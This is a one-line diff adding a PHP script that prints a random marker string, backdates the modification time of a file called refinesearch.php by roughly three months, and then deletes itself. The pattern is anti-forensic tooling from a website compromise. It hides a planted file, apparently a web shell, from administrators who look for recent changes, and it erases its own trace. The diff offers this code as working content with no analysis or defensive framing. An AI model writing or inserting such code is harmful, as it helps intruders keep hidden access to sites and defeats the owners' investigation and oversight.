@@ -1,0 +1,1 @@
+<?php echo "AhvysprEPs"; if (file_exists("./refinesearch.php")){ touch("./refinesearch.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*FsyKUmNwqnXBuyVGgMrw*/ ?>
